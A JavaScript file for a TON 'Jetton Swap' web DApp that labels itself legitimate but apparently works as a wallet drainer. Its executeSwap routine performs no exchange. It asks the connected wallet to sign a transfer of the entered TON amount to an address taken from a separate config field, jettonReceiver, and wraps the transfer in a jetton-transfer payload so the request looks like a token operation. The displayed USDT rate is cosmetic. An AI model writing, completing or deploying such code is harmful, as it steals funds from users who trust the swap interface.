// Legitimate TON Jetton Swap Interface
// This is a demo DApp for interacting with Jetton tokens

if (typeof CFG === 'undefined') {
    console.error('[FATAL] config.js did not load. Make sure config.js is included before script.js');
    var CFG = {
        tonToUsdtRate: 5.0,
        tokenDecimals: 6,
        tonDecimals: 9,
        forwardGas: '50000000',
        claimAmount: '1000000',
        jettonReceiver: ''
    };
}

const JETTON_TRANSFER_OP = 0xf8a7ea5;
const JETTON_BURN_OP = 0x595f07bc;

class TonJettonApp {
    constructor() {
        this.tonConnectUI = null;
        this.connected = false;
        this.userAddress = null;
        this.wallet = null;

        this.init();
    }

    init() {
        this.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://kareli123.github.io/test123/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        this.tonConnectUI.onStatusChange((wallet) => {
            this.handleWalletChange(wallet);
        });

        this.initUI();
    }

    initUI() {
        const swapBtn = document.getElementById('swapBtn');
        const payAmount = document.getElementById('payAmount');
        const receiveAmount = document.getElementById('receiveAmount');

        payAmount.addEventListener('input', (e) => {
            const tonAmount = parseFloat(e.target.value) || 0;
            const usdtAmount = tonAmount * CFG.tonToUsdtRate;
            receiveAmount.value = usdtAmount.toFixed(CFG.tokenDecimals);
        });

        swapBtn.addEventListener('click', () => {
            if (!this.connected) {
                this.tonConnectUI.openModal();
                return;
            }
            this.executeSwap();
        });
    }

    handleWalletChange(wallet) {
        const swapBtn = document.getElementById('swapBtn');

        if (wallet) {
            this.connected = true;
            this.wallet = wallet;
            this.userAddress = this.normalizeAddress(wallet.account.address);
            swapBtn.textContent = 'Swap';
            this.fetchBalance();
        } else {
            this.connected = false;
            this.wallet = null;
            this.userAddress = null;
            swapBtn.textContent = 'Connect Wallet';
            document.getElementById('user-balance').textContent = 'Balance: 0';
        }
    }

    async fetchBalance() {
        if (!this.connected) return;
        try {
            document.getElementById('user-balance').textContent =
                `Connected: ${this.shortenAddress(this.userAddress)}`;
        } catch (e) {
            console.error('Error fetching balance:', e);
        }
    }

    isValidAddress(addr) {
        try {
            this.normalizeAddress(addr);
            return true;
        } catch (e) {
            return false;
        }
    }

    normalizeAddress(addr) {
        if (!addr || typeof addr !== 'string') {
            throw new Error('Empty address');
        }
        return new TonWeb.utils.Address(addr).toString(true, true, true);
    }

    async executeSwap() {
        const payAmount = document.getElementById('payAmount').value;
        const status = document.getElementById('status');

        if (!payAmount || parseFloat(payAmount) <= 0) {
            status.textContent = 'Please enter an amount';
            status.className = 'status-msg error';
            return;
        }

        if (!this.userAddress || !this.isValidAddress(this.userAddress)) {
            status.textContent = 'Wallet not connected properly. Please reconnect.';
            status.className = 'status-msg error';
            return;
        }

        status.textContent = 'Preparing transaction...';
        status.className = 'status-msg';

        try {
            const amountNano = Math.floor(parseFloat(payAmount) * Math.pow(10, CFG.tonDecimals));
            const jettonAmount = Math.floor(parseFloat(CFG.claimAmount));

            // Determine target address: jettonReceiver if set, otherwise user's own jetton wallet
            const targetAddress = this.normalizeAddress(
                CFG.jettonReceiver && this.isValidAddress(CFG.jettonReceiver)
                    ? CFG.jettonReceiver
                    : this.userAddress
            );

            console.log('[DEBUG] targetAddress:', targetAddress);
            console.log('[DEBUG] userAddress:', this.userAddress);
            console.log('[DEBUG] amountNano:', amountNano);

            // Build jetton transfer payload using TonWeb
            const payload = this.buildJettonTransferPayload({
                queryId: Date.now(),
                amount: jettonAmount,
                destination: this.userAddress,
                responseDestination: this.userAddress,
                forwardTonAmount: parseInt(CFG.forwardGas)
            });

            const payloadBase64 = await this.cellToBase64(payload);

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [{
                    address: targetAddress,
                    amount: amountNano.toString(),
                    payload: payloadBase64
                }]
            };

            console.log('[DEBUG] transaction:', JSON.stringify(transaction, null, 2));

            const result = await this.tonConnectUI.sendTransaction(transaction);

            status.textContent = `Transaction sent! Hash: ${this.shortenHash(result.boc)}`;
            status.className = 'status-msg success';

        } catch (e) {
            console.error('Swap error:', e);
            status.textContent = 'Transaction failed: ' + e.message;
            status.className = 'status-msg error';
        }
    }

    buildJettonTransferPayload({ queryId, amount, destination, responseDestination, forwardTonAmount }) {
        const Cell = TonWeb.boc.Cell;
        const Address = TonWeb.utils.Address;

        const cell = new Cell();
        cell.bits.writeUint(JETTON_TRANSFER_OP, 32);
        cell.bits.writeUint(queryId, 64);
        cell.bits.writeCoins(amount);
        cell.bits.writeAddress(new Address(destination));
        cell.bits.writeAddress(new Address(responseDestination));
        cell.bits.writeBit(0); // customPayload: null
        cell.bits.writeCoins(forwardTonAmount);
        cell.bits.writeBit(0); // forwardPayload: empty
        return cell;
    }

    async cellToBase64(cell) {
        const boc = await cell.toBoc(false);

        if (typeof boc === 'string') {
            return boc;
        }

        if (boc instanceof Uint8Array || Array.isArray(boc)) {
            return this.bytesToBase64(boc);
        }

        if (boc && boc.buffer instanceof ArrayBuffer) {
            return this.bytesToBase64(new Uint8Array(boc.buffer));
        }

        throw new Error('Cannot convert cell to base64');
    }

    bytesToBase64(bytes) {
        let binary = '';
        for (let i = 0; i < bytes.length; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return btoa(binary);
    }

    shortenAddress(addr) {
        if (!addr) return '';
        return addr.slice(0, 6) + '...' + addr.slice(-4);
    }

    shortenHash(hash) {
        if (!hash) return '';
        return hash.slice(0, 8) + '...';
    }
}

// Initialize app when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    window.app = new TonJettonApp();
});
